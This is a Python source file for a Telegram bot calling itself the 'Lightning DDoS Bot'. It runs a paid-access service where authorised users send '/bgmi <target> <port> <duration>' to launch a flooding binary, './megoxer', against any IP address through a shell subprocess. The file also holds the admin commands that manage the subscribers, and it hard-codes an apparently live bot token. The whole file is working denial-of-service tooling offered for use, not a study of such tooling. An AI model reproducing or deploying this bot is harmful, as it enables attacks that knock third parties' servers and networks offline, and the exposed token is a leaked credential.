import telebot
import datetime
import os
import time
import logging
import re
from collections import defaultdict
import subprocess
from threading import Timer
import random

# Set up logging
logging.basicConfig(level=logging.INFO)

# Constants
MAX_ATTACK_DURATION = 240  # Maximum attack duration in seconds (4 minutes)
USER_ACCESS_FILE = "user_access.txt"
ATTACK_LOG_FILE = "attack_log.txt"
OWNER_ID = "6442837812"  # Owner's user ID (full access)
# Initially, the only admin in the system is the owner.
SUB_ADMINS = set()       # Will hold sub-admin user IDs

# Cooldown configuration
DEFAULT_COOLDOWN = 1 # seconds (default remains in seconds)
user_cooldowns = {}   # per-user cooldown in seconds

# This dictionary will record which admin granted which user.
# Keys are admin IDs (owner or sub-admin), and values are sets of user IDs.
admin_users = {}

# Allowed group chats for bot usage (for group chats only)
ALLOWED_CHAT_IDS = set()

# Replace with your Telegram bot token
bot = telebot.TeleBot('7530938442:AAHWIPs-vEFSlIhthQzzRA0jXZ-G5GYszvA')

# Dictionary to store user access information (user_id: expiration_date)
user_access = {}

# Track active attacks
active_attacks = []

# Dictionary to store attack limits (user_id: max_attack_duration)
attack_limits = {}

# Rate limiting
user_command_count = defaultdict(int)
last_command_time = {}

# Ensure the access file exists
if not os.path.exists(USER_ACCESS_FILE):
    open(USER_ACCESS_FILE, "w").close()

# Helper decorator to restrict bot usage in group chats
def allowed_chat_only(func):
    def wrapper(message, *args, **kwargs):
        if message.chat.type in ["group", "supergroup"]:
            if message.chat.id not in ALLOWED_CHAT_IDS:
                bot.reply_to(message, "🚫 This chat is not allowed to use this bot.")
                return
        return func(message, *args, **kwargs)
    return wrapper

# Load user access information from file
def load_user_access():
    try:
        with open(USER_ACCESS_FILE, "r") as file:
            access = {}
            for line in file:
                user_id, expiration = line.strip().split(",")
                access[user_id] = datetime.datetime.fromisoformat(expiration)
            return access
    except FileNotFoundError:
        return {}
    except ValueError as e:
        logging.error(f"Error loading user access file: {e}")
        return {}

# Save user access information to file
def save_user_access():
    temp_file = f"{USER_ACCESS_FILE}.tmp"
    try:
        with open(temp_file, "w") as file:
            for user_id, expiration in user_access.items():
                file.write(f"{user_id},{expiration.isoformat()}\n")
        os.replace(temp_file, USER_ACCESS_FILE)
    except Exception as e:
        logging.error(f"Error saving user access file: {e}")

# Log attack details
def log_attack(user_id, target, port, duration):
    try:
        with open(ATTACK_LOG_FILE, "a") as log_file:
            log_file.write(f"{datetime.datetime.now()}: User {user_id} attacked {target}:{port} for {duration} seconds.\n")
    except Exception as e:
        logging.error(f"Error logging attack: {e}")

# Validate IP address
def is_valid_ip(ip):
    return re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip) is not None

# Rate limiting: Use per-user cooldown (in seconds) if set, else default to DEFAULT_COOLDOWN seconds.
def is_rate_limited(user_id):
    now = datetime.datetime.now()
    cooldown = user_cooldowns.get(user_id, DEFAULT_COOLDOWN)
    if user_id in last_command_time and (now - last_command_time[user_id]) < datetime.timedelta(seconds=cooldown):
        user_command_count[user_id] += 1
        if user_command_count[user_id] > 3:
            return True
    else:
        user_command_count[user_id] = 1
        last_command_time[user_id] = now
    return False

# Load access information on startup
user_access = load_user_access()

# ---------------------------
# Regular Bot Commands
# ---------------------------

# Command: /start
@bot.message_handler(commands=['start'])
@allowed_chat_only
def start_command(message):
    logging.info("Start command received")
    welcome_message = """
    🌟 Welcome to the **Lightning DDoS Bot**! 🌟

   ⚡️ With this bot, you can:
    - Check your subscription status.
    - Simulate powerful attacks responsibly.
    - Manage access and commands efficiently.

    🚀 Use `/help` to see the available commands and get started!

    🛡️ For assistance, contact [@wtf_vai]

    **Note:** Unauthorized access is prohibited. Contact an admin if you need access.
    """
    bot.reply_to(message, welcome_message, parse_mode='Markdown')

# Command: /bgmi or /attack
@bot.message_handler(commands=['bgmi', 'attack'])
@allowed_chat_only
def handle_bgmi(message):
    logging.info("BGMI command received")
    global active_attacks
    caller_id = str(message.from_user.id)

    if caller_id not in user_access or user_access[caller_id] < datetime.datetime.now():
        bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
        return

    if is_rate_limited(caller_id):
        bot.reply_to(message, "🚨 Too many requests!")
        return

    command = message.text.split()
    if len(command) != 4 or not command[3].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/bgmi <target> <port> <duration>`", parse_mode='Markdown')
        return

    target, port, duration = command[1], command[2], int(command[3])

    if not is_valid_ip(target):
        bot.reply_to(message, "❌ Invalid target IP! Please provide a valid IP address.")
        return

    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
        return

    if duration > MAX_ATTACK_DURATION:
        bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
        return

    # Check if the caller has a custom attack limit set
    if caller_id in attack_limits and duration > attack_limits[caller_id]:
        bot.reply_to(message, f"⚠️ Your maximum allowed attack duration is {attack_limits[caller_id]} seconds.")
        return

    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if len(current_active) >= 100:
        bot.reply_to(message, "🚨 Maximum of 1 concurrent attack allowed. Please wait for the current attack to finish before launching a new one.")
        return

    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    attack_info = {'user_id': caller_id, 'target': target, 'port': port, 'end_time': attack_end_time}
    active_attacks.append(attack_info)
    log_attack(caller_id, target, port, duration)

    msg = bot.send_message(
        message.chat.id,
        f"""
⚡️🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 🔥⚡️

👑 **Commander**: `{caller_id}`
🎯 **Target Locked**: `{target}`
📡 **Port Engaged**: `{port}`
⏳ **Duration**: `{duration} seconds`
⚔️ **Weapon**: `BGMI Protocol`
🔥 **The wrath is unleashed. May the network shatter!** 🔥
        """,
        parse_mode='Markdown'
    )

    full_command = f"./megoxer {target} {port} {duration} 900"
    try:
        subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        logging.error(f"Subprocess error: {e}")
        bot.reply_to(message, "🚨 An error occurred while executing the attack command.")
        if attack_info in active_attacks:
            active_attacks.remove(attack_info)
        return

    def send_final_message():
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"""
✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅**  
🎯 **Target**: `{target}`
📡 **Port**: `{port}`
⏳ **Duration**: `{duration} seconds`
🔥 **Attack finished successfully!** 🔥
                """,
                parse_mode='Markdown'
            )
        except Exception as e:
            logging.error(f"Failed to send final message: {e}")
        finally:
            if attack_info in active_attacks:
                active_attacks.remove(attack_info)
    Timer(duration, send_final_message).start()

# Command: /when
@bot.message_handler(commands=['when'])
@allowed_chat_only
def when_command(message):
    logging.info("When command received")
    global active_attacks
    active_attacks = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
    if not active_attacks:
        bot.reply_to(message, "No attacks are currently in progress.")
        return

    active_attack_message = "Current active attacks:\n"
    for attack in active_attacks:
        target = attack['target']
        port = attack['port']
        time_remaining = max((attack['end_time'] - datetime.datetime.now()).total_seconds(), 0)
        active_attack_message += f"🌐 Target: `{target}`, 📡 Port: `{port}`, ⏳ Remaining Time: {int(time_remaining)} seconds\n"
    bot.reply_to(message, active_attack_message)

# Command: /help
@bot.message_handler(commands=['help'])
@allowed_chat_only
def help_command(message):
    logging.info("Help command received")
    help_text = """
    🚀 **Available Commands:**
    - **/start** - 🎉 Get started with a warm welcome message!
    - **/help** - 📖 Discover all the amazing things this bot can do for you!
    - **/bgmi <target> <port> <duration>** - ⚡ Launch an attack.
    - **/when** - ⏳ Check the remaining time for current attacks.
    - **/grant <user_id> <days>** - Grant user access (Admin only).
    - **/revoke <user_id>** - Revoke user access (Admin only).
    - **/attack_limit <user_id> <max_duration>** - Set max attack duration (Admin only).
    - **/status** - Check your subscription status.
    - **/list_users** - List all users with access (Admin only).
    - **/backup** - Backup user access data (Admin only).
    - **/download_backup** - Download user data (Admin Only).
    - **/set_cooldown <user_id> <minutes>** - Set a user’s cooldown time in minutes (minimum 1 minute, Owner only).
    - **/allow_chat** - Allow this chat to use the bot (Owner only).
    - **/add_admin <user_id>** - (Owner only) Add a sub-admin.
    - **/remove_admin <user_id>** - (Owner only) Remove a sub-admin.
    
    📋 **Usage Notes:**
    - 🔄 Replace `<user_id>`, `<target>`, `<port>`, `<duration>`, and `<minutes>` with the appropriate values.
    - 📞 Need help? Contact an admin for permissions or support – they're here to assist!
    """.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("]", "\\]").replace("`", "\\`")
    try:
        bot.reply_to(message, help_text, parse_mode='Markdown')
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Telegram API error: {e}")
        bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")

# ---------------------------
# Admin Commands
# (Admins include the owner and sub-admins. Sub-admins can only manage their granted users.)
# ---------------------------

# Command: /grant <user_id> <days>
@bot.message_handler(commands=['grant'])
@allowed_chat_only
def grant_command(message):
    logging.info("Grant command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID and caller not in SUB_ADMINS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/grant <user_id> <days>`")
        return

    target_user = command[1]
    days = int(command[2])
    expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)
    user_access[target_user] = expiration_date
    save_user_access()

    if caller not in admin_users:
        admin_users[caller] = set()
    admin_users[caller].add(target_user)

    bot.reply_to(message, f"✅ User {target_user} granted access until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}.")

# Command: /revoke <user_id>
@bot.message_handler(commands=['revoke'])
@allowed_chat_only
def revoke_command(message):
    logging.info("Revoke command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID and caller not in SUB_ADMINS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Invalid format! Use: `/revoke <user_id>`")
        return

    target_user = command[1]
    if caller != OWNER_ID:
        if caller not in admin_users or target_user not in admin_users[caller]:
            bot.reply_to(message, "❌ You are not authorized to revoke access for this user.")
            return

    if target_user in user_access:
        del user_access[target_user]
        save_user_access()
        if caller in admin_users and target_user in admin_users[caller]:
            admin_users[caller].remove(target_user)
        bot.reply_to(message, f"✅ User {target_user} access has been revoked.")
    else:
        bot.reply_to(message, f"❌ User {target_user} does not have access.")

# Command: /attack_limit <user_id> <max_duration>
@bot.message_handler(commands=['attack_limit'])
@allowed_chat_only
def attack_limit_command(message):
    logging.info("Attack limit command received")
    caller = str(message.from_user.id)
    if caller != OWNER_ID and caller not in SUB_ADMINS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/attack_limit <user_id> <max_duration>`")
        return

    target_user, max_duration = command[1], int(command[2])
    attack_limits[target_user] = max_duration
    bot.reply_to(message, f"✅ User {target_user} can now launch attacks up to {max_duration} seconds.")

# Modified Command: /list_users
@bot.message_handler(commands=['list_users'])
@allowed_chat_only
def list_users_command(message):
    logging.info("List users command received")
    caller = str(message.from_user.id)
    now = datetime.datetime.now()
    if caller == OWNER_ID:
        admin_lines = []
        user_lines = []
        for uid, exp in user_access.items():
            days_left = max((exp - now).days, 0)
            try:
                chat_info = bot.get_chat(uid)
                name = chat_info.first_name if chat_info.first_name else uid
            except Exception:
                name = uid
            line = f"{name} (User ID: {uid}) - {days_left} day(s) left"
            if uid == OWNER_ID or uid in SUB_ADMINS:
                admin_lines.append(line)
            else:
                user_lines.append(line)
        reply_text = "Admins:\n" + "\n".join(admin_lines) + "\n\nUsers:\n" + "\n".join(user_lines)
        bot.reply_to(message, reply_text)
    else:
        if caller not in admin_users or not admin_users[caller]:
            bot.reply_to(message, "You have not granted access to any users.")
            return
        lines = []
        for uid in admin_users[caller]:
            if uid in user_access:
                days_left = max((user_access[uid] - now).days, 0)
            else:
                days_left = "Unknown"
            try:
                chat_info = bot.get_chat(uid)
                name = chat_info.first_name if chat_info.first_name else uid
            except Exception:
                name = uid
            lines.append(f"{name} (User ID: {uid}) - {days_left} day(s) left")
        reply_text = "Your granted users:\n" + "\n".join(lines)
        bot.reply_to(message, reply_text)

# Command: /backup
@bot.message_handler(commands=['backup'])
@allowed_chat_only
def backup_command(message):
    logging.info("Backup command received")
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "w") as backup_file:
        for uid, exp in user_access.items():
            try:
                chat_info = bot.get_chat(uid)
                name = chat_info.first_name if chat_info.first_name else uid
            except Exception as e:
                logging.error(f"Error retrieving chat info for {uid}: {e}")
                name = uid
            backup_file.write(f"{uid},{name},{exp.isoformat()}\n")
    bot.reply_to(message, "✅ User access data has been backed up.")
    
# Command: /download_backup
@bot.message_handler(commands=['download_backup'])
@allowed_chat_only
def download_backup(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    with open("user_access_backup.txt", "rb") as backup_file:
        bot.send_document(message.chat.id, backup_file)

# Command: /set_cooldown <user_id> <minutes>
@bot.message_handler(commands=['set_cooldown'])
@allowed_chat_only
def set_cooldown_command(message):
    logging.info("Set cooldown command received")
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    command = message.text.split()
    if len(command) != 3 or not command[2].isdigit():
        bot.reply_to(message, "Invalid format! Use: `/set_cooldown <user_id> <minutes>`", parse_mode='Markdown')
        return
    target_user_id = command[1]
    new_cooldown_minutes = int(command[2])
    if new_cooldown_minutes < 1:
        new_cooldown_minutes = 1
    new_cooldown_seconds = new_cooldown_minutes * 60
    user_cooldowns[target_user_id] = new_cooldown_seconds
    bot.reply_to(message, f"✅ Cooldown for user {target_user_id} set to {new_cooldown_minutes} minute(s).")

# Command: /allow_chat (Owner only)
@bot.message_handler(commands=['allow_chat'])
def allow_chat(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can use this command.")
        return
    if message.chat.type in ["group", "supergroup"]:
        ALLOWED_CHAT_IDS.add(message.chat.id)
        bot.reply_to(message, f"✅ This chat (ID: {message.chat.id}) is now allowed to use the bot.")
    else:
        bot.reply_to(message, "This command is meant for group chats only.")

# New Command: /add_admin <user_id> (Owner only)
@bot.message_handler(commands=['add_admin'])
def add_admin(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can add admins.")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Invalid format! Use: `/add_admin <user_id>`")
        return
    new_admin = command[1]
    if new_admin in SUB_ADMINS:
        bot.reply_to(message, "This user is already a sub-admin.")
        return
    SUB_ADMINS.add(new_admin)
    admin_users[new_admin] = set()
    bot.reply_to(message, f"✅ User {new_admin} has been added as a sub-admin.")

# New Command: /remove_admin <user_id> (Owner only)
@bot.message_handler(commands=['remove_admin'])
def remove_admin(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "❌ Only the owner can remove admins.")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Invalid format! Use: `/remove_admin <user_id>`")
        return
    rem_admin = command[1]
    if rem_admin not in SUB_ADMINS:
        bot.reply_to(message, "This user is not a sub-admin or is the owner.")
        return
    SUB_ADMINS.remove(rem_admin)
    if rem_admin in admin_users:
        del admin_users[rem_admin]
    bot.reply_to(message, f"✅ Admin access removed from user {rem_admin}.")

# Command: /status
@bot.message_handler(commands=['status'])
@allowed_chat_only
def status_command(message):
    caller = str(message.from_user.id)
    if caller in user_access:
        expiration = user_access[caller]
        bot.reply_to(message, f"✅ Your access is valid until {expiration.strftime('%Y-%m-%d %H:%M:%S')}.")
    else:
        bot.reply_to(message, "❌ You do not have access. Contact an admin.")

# Polling with retry logic
while True:
    try:
        bot.polling(none_stop=True, interval=0, allowed_updates=["message"])
    except Exception as e:
        logging.error(f"Polling error: {e}")
        time.sleep(5)
